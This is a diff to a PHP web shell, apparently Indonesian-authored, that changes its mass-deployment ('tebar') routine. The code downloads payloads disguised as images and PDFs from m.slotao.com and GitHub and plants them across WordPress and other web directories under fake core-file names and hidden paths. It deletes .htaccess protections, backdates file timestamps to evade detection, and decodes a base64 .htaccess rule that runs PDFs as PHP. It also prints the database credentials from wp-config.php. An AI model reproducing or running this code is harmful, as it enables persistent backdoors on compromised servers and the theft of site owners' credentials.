@@ -2101,19 +2101,19 @@ Link Config: <br>
 						</form>";
 			echo "<hr>";
 		} elseif (isset($_GET[hex('signature')])) {
-						$direktori = $_SERVER['DOCUMENT_ROOT'];
+			$direktori = $_SERVER['DOCUMENT_ROOT'];
 
 
 			
 			if (file_exists($direktori."/wp-config.php")) {
 					echo '<br><br>';
-					echo "<center><h3 style='color: green;'>WP Detected pada path: ".$direktori."</h3></center>";
+					echo "<center><h3 style='color: green;'>WP: ".$direktori."</h3></center>";
 				}
 			echo '
 				<br><br>
 				<form action="" method="post">
 					<center>
-					Tebarkan di (wajib pakai / diakhir) :
+					Tebarkan di (wajib pakai / diakhir jika non-wp) :<br>
 						<input class="form-control" type="text" name="direktorix" value="'.$direktori.'" style="width: 450px;" height="10"><br>
 						<input type="submit" class="form-control" style="width: 250px; height: 40px;" value="Tebar" name="tebar" />
 
@@ -2121,12 +2121,12 @@ Link Config: <br>
 				</form>
 				';
 			if ($_POST['tebar']) {
-
-
 				
-				$direktori = $_SERVER['DOCUMENT_ROOT'];
+				$folderio = $_POST['direktorix'];
+				echo "<br><br><center><h3>Hajar miring ".$folderio."</h3></center>";
+
 				$fullxx = $_SERVER['HTTP_HOST'] . str_replace($_SERVER['DOCUMENT_ROOT'], "", $direktori);
-				$folder = $_POST['direktorix'];
+				
 
 				$itemsxz = array("https://m.slotao.com/licenses.png", "https://m.slotao.com/mari.png", "https://m.slotao.com/supre.png", "https://raw.githubusercontent.com/dono-zz/1945/main/mari.png", "https://m.slotao.com/class-wp-customize-nav-menu-customize.png", "https://m.slotao.com/Note.png", "https://github.com/vrana/adminer/releases/download/v4.8.1/adminer-4.8.1-mysql-en.php", "https://m.slotao.com/maridono.pdf");
 				
@@ -2140,155 +2140,194 @@ Link Config: <br>
         		$resource7 = "https://github.com/vrana/adminer/releases/download/v4.8.1/adminer-4.8.1-mysql-en.php";
         		$resource8 = "https://m.slotao.com/maridono.pdf";
 
-        		if ($_POST['direktorix']) {
-					if (file_exists($folder."/wp-config.php")) {
-						
-						$targetSitez = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]";
-						
-						$srcz = mari_get_contents($targetSitez);
+                if ($folderio) {
 
-						preg_match("/.*stylesheet.*href=.*\/themes\/(.*?)\/.*\.css.*\>/i",$srcz,$matchesz);
-						$styleHrefz = trim($matchesz[1]);
-						if ($styleHrefz ) {
-						echo "<center>Themes Wordpress: <strong><h2>". $styleHrefz . "</h2></strong></center>";
-						} else { echo "<center>Themes Wordpress: <strong><h2>Website Error</h2></strong></center>"; }
+                	$lapor8 = $folderio.'/wp-config.php';
+                    if (file_exists($lapor8)) {
+                        
+                        $targetSitez = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]";
+                        
+                        $srcz = mari_get_contents($targetSitez);
+
+                        preg_match("/.*stylesheet.*href=.*\/themes\/(.*?)\/.*\.css.*\>/i",$srcz,$matchesz);
+                        $styleHrefz = trim($matchesz[1]);
+                        if ($styleHrefz ) {
+                        echo "<br><br><center>Themes Wordpress: <strong><h2>". $styleHrefz . "</h2></strong></center>";
+                        } else { echo "<br><br><center>Themes Wordpress: <strong><h2>Website Error</h2></strong></center>"; }
 
 
 
-						$lapor1 = $folder.'/.tmb/index.php';
-						$lapor2 = $folder.'/wp-content/upgrade/mari.php';
-						$lapor3 = $folder.'/wp-content/uploads/'.date("Y").'/'.date("n").'/supre.php';
-						$lapor4 = $folder.'/licenses.php';
-						$lapor5 = $folder.'/wp-admin/Note.php';
-						$lapor6 = $folder.'/wp-includes/class-wp-customize-nav-menu-customize.php';
-						$lapor7	= $folder.'/wp-config-sample.php';
-						$lapor8	= $folder.'/wp-config.php';	
-						$lapor9	= $folder.'/.well-known/pki-validation/.../index.php';
-						$penanggalan = date("Y").'/'.date("n");
-						if (!is_dir($folder .'/.tmb')) { mkdir($folder . '/.tmb', 0755, true); }
-						if (!is_dir($folder .'/wp-includes')) { mkdir($folder . '/wp-includes', 0755, true); }
-						if (!is_dir($folder .'/wp-admin')) { mkdir($folder . '/wp-admin', 0755, true); }
-						if (!is_dir($folder .'/wp-content/upgrade')) { mkdir($folder . '/wp-content/upgrade', 0755, true); }
-						if (!is_dir($folder .'/.well-known/pki-validation')) { mkdir($folder . '/.well-known/pki-validation/...', 0755, true); }				
-						if (!is_dir($folder .'/wp-content/uploads/'.$penanggalan)) { mkdir($folder . '/wp-content/uploads/'.$penanggalan, 0755, true); }
-						chmod($folder.'/wp-content/.htaccess', 0644 );
-						chmod($folder.'/wp-admin/wp-includes/.htaccess', 0644 );
-						chmod($folder.'/wp-includes/.htaccess', 0644 );
-						chmod($folder.'/.tmb/.htaccess', 0644 );
-						chmod($folder.'/wp-content/.htaccess', 0644 );
-						chmod($folder.'/wp-content/uploads/'.date("Y").'/.htaccess', 0644 );
-						chmod($folder.'/wp-content/uploads/'.$penanggalan.'/.htaccess', 0644 );
+                        $lapor1 = $folderio.'/.tmb/index.php';
+                        $lapor2 = $folderio.'/wp-content/upgrade/mari.php';
+                        $lapor3 = $folderio.'/wp-content/uploads/'.date("Y").'/'.date("n").'/supre.php';
+                        $lapor4 = $folderio.'/licenses.php';
+                        $lapor5 = $folderio.'/wp-admin/Note.php';
+                        $lapor6 = $folderio.'/wp-includes/class-wp-customize-nav-menu-customize.php';
+                        $lapor7 = $folderio.'/wp-config-sample.php';
+                        $laporanz = array($lapor1, $lapor4, $lapor5, $lapor6, $lapor7);
+                         
+                        $lapor9 = $folderio.'/.well-known/pki-validation/.../index.php';
 
-						unlink($folder.'/wp-content/.htaccess');
-						unlink($folder.'/wp-admin/wp-includes/.htaccess');
-						unlink($folder.'/wp-includes/.htaccess');
-						unlink($folder.'/.tmb/.htaccess');
-						unlink($folder.'/wp-content/uploads/.htaccess');
-						unlink($folder.'/wp-content/uploads/'.date("Y").'/.htaccess');
-						unlink($folder.'/wp-content/uploads/'.$penanggalan.'/.htaccess');
+                        $penanggalan = date("Y").'/'.date("n");
+                       	if (is_writable($folderio)) {    
+	                        if (!is_dir($folderio .'/.tmb')) { mkdir($folderio . '/.tmb', 0755, true); }
+	                        if (!is_dir($folderio .'/wp-includes')) { mkdir($folderio . '/wp-includes', 0755, true); }
+	                        if (!is_dir($folderio .'/wp-admin')) { mkdir($folderio . '/wp-admin', 0755, true); }
+	                        if (!is_dir($folderio .'/wp-content/upgrade')) { mkdir($folderio . '/wp-content/upgrade', 0755, true); }
+	                        if (!is_dir($folderio .'/.well-known/pki-validation')) { mkdir($folderio . '/.well-known/pki-validation/...', 0755, true); }                
+	                        if (!is_dir($folderio .'/wp-content/uploads/'.$penanggalan)) { mkdir($folderio . '/wp-content/uploads/'.$penanggalan, 0755, true); }
+                    	}
 
-						$report1 = mari_get_contents($resource1); file_put_contents($lapor1, $report1); @touch($lapor1, strtotime('-'.rand(30,90).' days', time()));		
-						$report2 = mari_get_contents($resource2); file_put_contents($lapor2, $report2); @touch($lapor2, strtotime('-'.rand(30,90).' days', time()));		
-						$report3 = mari_get_contents($resource3); file_put_contents($lapor3, $report3); @touch($lapor3, strtotime('-'.rand(30,90).' days', time()));		
-						$report4 = mari_get_contents($resource4); file_put_contents($lapor4, $report4); @touch/**/($lapor4, strtotime('-'.rand(30,90).' days', time()));		
-						$report5 = mari_get_contents($resource5); file_put_contents($lapor5, $report5); @touch/**/($lapor5, strtotime('-'.rand(30,90).' days', time()));		
-						$report6 = mari_get_contents($resource6); file_put_contents($lapor6, $report6); @touch($lapor6, strtotime('-'.rand(30,90).' days', time()));	
-						$report7 = mari_get_contents($resource7); file_put_contents($lapor7, $report7); @touch($lapor7, strtotime('-'.rand(30,90).' days', time()));
-						$report9 = mari_get_contents($resource8); file_put_contents($lapor9, $report9); @touch/**/($lapor9, strtotime('-'.rand(30,90).' days', time()));		
-						echo "<a href='//".$fullx.str_replace($_SERVER['DOCUMENT_ROOT'], "", $lapor1)."''>".$fullx.str_replace($_SERVER['DOCUMENT_ROOT'], "", $lapor1)."</a><br>";
-						echo "<a href='//".$fullx.str_replace($_SERVER['DOCUMENT_ROOT'], "", $lapor2)."'>".$fullx.str_replace($_SERVER['DOCUMENT_ROOT'], "", $lapor2)."</a><br>";
-						echo "<a href='//".$fullx.str_replace($_SERVER['DOCUMENT_ROOT'], "", $lapor3)."'>".$fullx.str_replace($_SERVER['DOCUMENT_ROOT'], "", $lapor3)."</a><br>";
-						echo "<a href='//".$fullx.str_replace($_SERVER['DOCUMENT_ROOT'], "", $lapor4)."'>".$fullx.str_replace($_SERVER['DOCUMENT_ROOT'], "", $lapor4)."</a><br>";
-						echo "<a href='//".$fullx.str_replace($_SERVER['DOCUMENT_ROOT'], "", $lapor5)."'>".$fullx.str_replace($_SERVER['DOCUMENT_ROOT'], "", $lapor5)."</a><br>";
-						echo "<a href='//".$fullx.str_replace($_SERVER['DOCUMENT_ROOT'], "", $lapor6)."'>".$fullx.str_replace($_SERVER['DOCUMENT_ROOT'], "", $lapor6)."</a><br>";
-						echo "<a href='//".$fullx.str_replace($_SERVER['DOCUMENT_ROOT'], "", $lapor9)."'>".$fullx.str_replace($_SERVER['DOCUMENT_ROOT'], "", $lapor9)."</a><br><br>";
-						echo "Adminer :";
-						echo "<a href='//".$fullx.str_replace($_SERVER['DOCUMENT_ROOT'], "", $lapor7)."'>".$fullx.str_replace($_SERVER['DOCUMENT_ROOT'], "", $lapor7)."</a><br>";
-						
-						if (file_exists($lapor8)) {
-							require_once($lapor8);
-							echo DB_HOST."<br>";
-							echo DB_USER."<br>";
-							echo DB_PASSWORD."<br>";
-							echo DB_NAME."<br>";
-						} 
+                    	$i = 0;
+                        foreach (scandir($folderio) as $detailsfolderx) {
+	                        $wpfolder = $folderio.DIRECTORY_SEPARATOR.$detailsfolderx;
+	                        if (is_dir($wpfolder) && $detailsfolderx != "." && $detailsfolderx != "..") {   
+	                        	
+	                        	if (is_writable($wpfolder)) {
+	                        		
+	                        	
+
+		                        	if ($detailsfolderx === "wp-content") {
+									    chmod($folderio.'/wp-content/.htaccess', 0644 );
+									    chmod($folderio.'/wp-content/.htaccess', 0644 );
+				                        chmod($folderio.'/wp-content/uploads/'.date("Y").'/.htaccess', 0644 );
+				                        chmod($folderio.'/wp-content/uploads/'.$penanggalan.'/.htaccess', 0644 );
+				                        unlink($folderio.'/wp-content/.htaccess');
+				                        unlink($folderio.'/wp-content/uploads/.htaccess');
+				                        unlink($folderio.'/wp-content/uploads/'.date("Y").'/.htaccess');
+				                        unlink($folderio.'/wp-content/uploads/'.$penanggalan.'/.htaccess');
+				                        $report200 = mari_get_contents($itemsxz[2]); file_put_contents($lapor2, $report200); @touch($lapor2, strtotime('-'.rand(30,90).' days', time()));        
+                        				$report300 = mari_get_contents($itemsxz[3]); file_put_contents($lapor3, $report300); @touch($lapor3, strtotime('-'.rand(30,90).' days', time())); 
+                        				if (file_exists($lapor2)) {
+                        					echo "<a href='//".$fullxx.str_replace($_SERVER['DOCUMENT_ROOT'], "", $lapor2)."'>".$fullxx.str_replace($_SERVER['DOCUMENT_ROOT'], "", $lapor2)."</a><br>";
+                        				}
+                        				if (file_exists($lapor3)) {
+                        					echo "<a href='//".$fullxx.str_replace($_SERVER['DOCUMENT_ROOT'], "", $lapor3)."'>".$fullx.str_replace($_SERVER['DOCUMENT_ROOT'], "", $lapor3)."</a><br>";
+                        				}
+                        			  
+									}
+
+									$report[$i] = mari_get_contents($itemsxz[$i]); file_put_contents($laporanz[$i], $report[$i]); @touch($laporanz[$i], strtotime('-'.rand(30,90).' days', time())); 
+									if (file_exists($laporanz[$i])) {
+										echo "<a href='//".$fullxx.str_replace($_SERVER['DOCUMENT_ROOT'], "", $laporanz[$i])."''>".$fullxx.str_replace($_SERVER['DOCUMENT_ROOT'], "", $laporanz[$i])."</a><br>";
+										chmod($wpfolder.'/.htaccess', 0644 );
+										unlink($wpfolder.'/.htaccess');
+									}
+									
+
+	                        	} 
+
+	                        } 
+	                        
+	                     }
+
+                    	
+
+      
+                        echo "<br>Adminer :";
+                        if (file_exists($lapor7)) {
+                        	echo "<a href='//".$fullxx.str_replace($_SERVER['DOCUMENT_ROOT'], "", $lapor7)."'>".$fullxx.str_replace($_SERVER['DOCUMENT_ROOT'], "", $lapor7)."</a><br>";
+                        }
+                        if (file_exists($lapor8)) {
+                            require_once($lapor8);
+                            echo DB_HOST."<br>";
+                            echo DB_USER."<br>";
+                            echo DB_PASSWORD."<br>";
+                            echo DB_NAME."<br>";
+                        } 
 					} else {
 
-						
-						
-								foreach (scandir($folder) as $detailsfolder) {
-									$items = array("login.php", "xmlrpc.php", "edit-form-advanced.php", "link-parse-opml.php", "ms-sites.php", "options-writing.php", "themes.php", "https.php", "class-https.php", "admin-ajax.php", "edit-form-comment.php", "link.php", "ms-themes.php", "mari.php", "plugin-editor.php", "admin-footer.php", "edit-link-form.php", "load-scripts.php", "ms-upgrade-network.php", "admin-functions.php", "edit.php", "load-styles.php", "ms-users.php", "plugins.php", "admin-header.php", "licenses.php", "edit-tag-form.php", "media-new.php", "my-sites.php", "apps.php", "post-new.php", "upgrade-themes.php", "admin.php", "sandwich.php", "edit-tags.php", "media.php", "nav-menus.php", "post.php", "admin-post.php", "maridono.php", "export.php", "Note.php", "media-upload.php", "network.php", "press-this.php", "upload.php", "async-upload.php", "menu-header.php", "options-discussion.php", "privacy.php", "user-edit.php", "menu.php", "options-general.php", "profile.php", "user-new.php", "moderation.php", "options-head.php", "revision.php", "users.php", "custom-background.php", "ms-admin.php", "options-media.php", "setup-config.php", "widgets.php", "theme-single.php", "custom-header.php", "ms-delete-site.php", "options-permalink.php", "term.php", "customize.php", "link-add.php", "supre.php", "ms-edit.php", "options.php", "edit-comments.php", "link-manager.php", "ms-options.php", "options-reading.php");
-																	
-									if(is_dir($detailsfolder) and $detailsfolder != "." && $detailsfolder != "..") {							
+                        
+                        		
+                                foreach (scandir($folderio) as $detailsfolder) {
+                                	$nonwpfolder = $folderio.DIRECTORY_SEPARATOR.$detailsfolder;
+                                    $items = array("login.php", "xmlrpc.php", "edit-form-advanced.php", "link-parse-opml.php", "ms-sites.php", "options-writing.php", "themes.php", "https.php", "class-https.php", "admin-ajax.php", "edit-form-comment.php", "link.php", "ms-themes.php", "mari.php", "plugin-editor.php", "admin-footer.php", "edit-link-form.php", "load-scripts.php", "ms-upgrade-network.php", "admin-functions.php", "edit.php", "load-styles.php", "ms-users.php", "plugins.php", "admin-header.php", "licenses.php", "edit-tag-form.php", "media-new.php", "my-sites.php", "apps.php", "post-new.php", "upgrade-themes.php", "admin.php", "sandwich.php", "edit-tags.php", "media.php", "nav-menus.php", "post.php", "admin-post.php", "maridono.php", "export.php", "Note.php", "media-upload.php", "network.php", "press-this.php", "upload.php", "async-upload.php", "menu-header.php", "options-discussion.php", "privacy.php", "user-edit.php", "menu.php", "options-general.php", "profile.php", "user-new.php", "moderation.php", "options-head.php", "revision.php", "users.php", "custom-background.php", "ms-admin.php", "options-media.php", "setup-config.php", "widgets.php", "theme-single.php", "custom-header.php", "ms-delete-site.php", "options-permalink.php", "term.php", "customize.php", "link-add.php", "supre.php", "ms-edit.php", "options.php", "edit-comments.php", "link-manager.php", "ms-options.php", "options-reading.php");
+                                                                    
+                                    if(is_dir($nonwpfolder) and $detailsfolder != "." && $detailsfolder != "..") {                            
 
-										if (is_writable($detailsfolder)) {
-											
-											if (file_exists($detailsfolder.'/.htaccess')) {
-											echo ">> Menghapus ".$detailsfolder."/.htaccess<br>";
-											chmod($detailsfolder.'/.htaccess', 0644 );
-											unlink($detailsfolder.'/.htaccess');
-											}
-											if ($detailsfolder === 'docs') {
-												if (!is_dir($detailsfolder .'/manual/')) { mkdir($detailsfolder . '/manual/', 0755, true); }
-												$lapor1 = $detailsfolder.'/manual/index.php';
-												$report1 = mari_get_contents($resource1); file_put_contents($lapor1, $report1); @touch/**/($lapor1, strtotime('-'.rand(30,90).' days', time()));
-												echo "<a href='//".$fullxx.str_replace($_SERVER['DOCUMENT_ROOT'], "", $folder.$lapor1)."''>".$fullx.str_replace($_SERVER['DOCUMENT_ROOT'], "", "/".$lapor1)."</a><br>"; 
-											}
-											if ($detailsfolder === 'public') {
-												if (!is_dir($detailsfolder .'/.../')) { mkdir($detailsfolder . '/.../', 0755, true); }
-												$lapor2 = $detailsfolder.'/.../index.php';
-												$report2 = mari_get_contents($resource1); file_put_contents($lapor2, $report2); @touch/***/($lapor2, strtotime('-'.rand(30,90).' days', time()));
-												echo "<a href='//".$fullxx.str_replace($_SERVER['DOCUMENT_ROOT'], "", $folder.$lapor2)."''>".$fullx.str_replace($_SERVER['DOCUMENT_ROOT'], "", "/".$lapor2)."</a><br>"; 
-											}
-											
-												if (is_array($itemsxz) || is_object($itemsxz)) {
-													foreach ($itemsxz as $resource0) {		
-														$namafile = $items[array_rand($items)];			
-														$lapor3 = $detailsfolder.'/'.$namafile;
-														$report3 = mari_get_contents($resource0); file_put_contents($lapor3, $report3); 
-														@touch/****/($lapor3, strtotime('-'.rand(30,90).' days', time())); 
-														@touch/****/($detailsfolder, strtotime('-'.rand(30,90).' days', time()));
-														chmod($lapor3, 0644 );
-
-														echo "<a href='//".$fullxx.str_replace($_SERVER['DOCUMENT_ROOT'], "", $folder.$lapor3)."'>".$fullx.str_replace($_SERVER['DOCUMENT_ROOT'], "", "/".$lapor3)."</a><br>"; 
-													}
-													unset($resource0);
-													unset($namafile);
-												}	
-											
-										}
-								}	
+                                        if (is_writable($nonwpfolder)) {
+                                            
+                                            if (file_exists($nonwpfolder.'/.htaccess')) {
+                                            
+                                            chmod($nonwpfolder.'/.htaccess', 0644 );
+                                            unlink($nonwpfolder.'/.htaccess');
+                                            }
+                                            if ($detailsfolder === 'docs') {
+                                                if (!is_dir($nonwpfolder .'/manual/')) { mkdir($nonwpfolder . '/manual/', 0755, true); }
+                                                $lapor1 = $nonwpfolder.'/manual/index.php';
+                                                $report1 = mari_get_contents($resource1); file_put_contents($lapor1, $report1); @touch/**/($lapor1, strtotime('-'.rand(30,90).' days', time()));
+                                                if (file_exists($lapor1)) {
+                                                	echo "<a href='//".$fullxx.str_replace($_SERVER['DOCUMENT_ROOT'], "", $lapor1)."' target='_blank'>".$fullxx.str_replace($_SERVER['DOCUMENT_ROOT'], "", "/".$lapor1)."</a><br>";
+                                                } 
+                                            }
+                                            if ($detailsfolder === 'public') {
+                                                if (!is_dir($nonwpfolder .'/.../')) { mkdir($nonwpfolder . '/.../', 0755, true); }
+                                                $lapor2 = $nonwpfolder.'/.../index.php';
+                                                $report2 = mari_get_contents($resource1); file_put_contents($lapor2, $report2); @touch/***/($lapor2, strtotime('-'.rand(30,90).' days', time()));
+                                                if (file_exists($lapor2)) {
+                                                	echo "<a href='//".$fullxx.str_replace($_SERVER['DOCUMENT_ROOT'], "", $lapor2)."' target='_blank'>".$fullxx.str_replace($_SERVER['DOCUMENT_ROOT'], "", "/".$lapor2)."</a><br>"; 
+                                            	}
+                                            }
+                                            	$i = 0;
+                                                if (is_array($itemsxz) || is_object($itemsxz)) {
+                                                         
+                                                        $namafile = $items[array_rand($items)];  
 
 
+                                                        $lapor3 = $nonwpfolder.'/'.$namafile;
+
+                                                        $report3 = mari_get_contents($itemsxz[$i]); file_put_contents($lapor3, $report3); 
+                                                        if (file_exists($lapor3)) {
+	                                                        @touch/****/($lapor3, strtotime('-'.rand(30,90).' days', time())); 
+	                                                        @touch/****/($nonwpfolder, strtotime('-'.rand(30,90).' days', time()));
+	                                                        chmod($lapor3, 0644 );
+
+	                                                        echo "<a href='//".$fullxx.str_replace($_SERVER['DOCUMENT_ROOT'], "", $lapor3)."' target='_blank'>".$fullxx.str_replace($_SERVER['DOCUMENT_ROOT'], "", $lapor3)."</a><br>";
 
 
-						
+	                                                    }
+	                                                    unset($namafile);
+	                                            $i++;   
+	                                                    
+                                                        
+                                                    
+                                                    
+                                                }   
+                                            
+                                        }
+                                }   
+
+
+                            
+
+                        
+						}
+						if (is_writable($direktori)) {
+							if (!is_dir($direktori .'/.well-known/pki-validation/.../')) { mkdir($direktori . '/.well-known/pki-validation/.../', 0755, true); }	
+							$lapor9	= $direktori.'/.well-known/pki-validation/.../index.php';
+							$report9 = mari_get_contents($resource8); file_put_contents($lapor9, $report9); @touch/**/($lapor9, strtotime('-'.rand(30,90).' days', time()));	
+							if (file_exists($lapor9)) {
+								echo "<a href='//".$fullx.str_replace($_SERVER['DOCUMENT_ROOT'], "", $lapor9)."''>".$fullx.str_replace($_SERVER['DOCUMENT_ROOT'], "", $lapor9)."</a><br>";
+							}
+							
+							if (!is_dir($direktori .'/-./')) { mkdir($direktori . '/-./', 0755, true); }	
+							$lapor5	= $direktori.'/-./lapor.pdf';
+							$report5 = mari_get_contents($resource3); file_put_contents($lapor5, $report5); @touch/**/($lapor5, strtotime('-'.rand(30,90).' days', time()));
+							$htaccess = $direktori."/-./.htaccess";
+						    $contentx = 'QWRkVHlwZSBhcHBsaWNhdGlvbi94LWh0dHBkLXBocCAucGRm';
+						    $contentx = base64_decode/*****/($contentx);
+						    @file_put_contents($htaccess, $contentx);
+						    if (file_exists($lapor5)) {
+								echo "<a href='//".$fullx.str_replace($_SERVER['DOCUMENT_ROOT'], "", $lapor5)."''>".$fullx.str_replace($_SERVER['DOCUMENT_ROOT'], "", $lapor5)."</a><br>"; 
+							}
 						}
 
-						if (!is_dir($direktori .'/.well-known/pki-validation/.../')) { mkdir($direktori . '/.well-known/pki-validation/.../', 0755, true); }	
-						$lapor9	= $direktori.'/.well-known/pki-validation/.../index.php';
-						$report9 = mari_get_contents($resource8); file_put_contents($lapor9, $report9); @touch/**/($lapor9, strtotime('-'.rand(30,90).' days', time()));	
-						echo "<a href='//".$fullx.str_replace($_SERVER['DOCUMENT_ROOT'], "", $lapor9)."''>".$fullx.str_replace($_SERVER['DOCUMENT_ROOT'], "", $lapor9)."</a><br>"; 
-						
-						if (!is_dir($direktori .'/.-/')) { mkdir($direktori . '/.-/', 0755, true); }	
-						$lapor5	= $direktori.'/.-/lapor.pdf';
-						$report5 = mari_get_contents($resource3); file_put_contents($lapor5, $report5); @touch/**/($lapor5, strtotime('-'.rand(30,90).' days', time()));
-						$htaccess = $direktori."/.-/.htaccess";
-					    $contentx = 'QWRkVHlwZSBhcHBsaWNhdGlvbi94LWh0dHBkLXBocCAucGRm';
-					    $contentx = base64_decode/*****/($contentx);
-					    @file_put_contents($htaccess, $contentx);
-						echo "<a href='//".$fullx.str_replace($_SERVER['DOCUMENT_ROOT'], "", $lapor5)."''>".$fullx.str_replace($_SERVER['DOCUMENT_ROOT'], "", $lapor5)."</a><br>"; 
-
 					}
-
-				}
-
-
-
-
-
-
+				}	
 			}
+			
+
+
 	
 
 
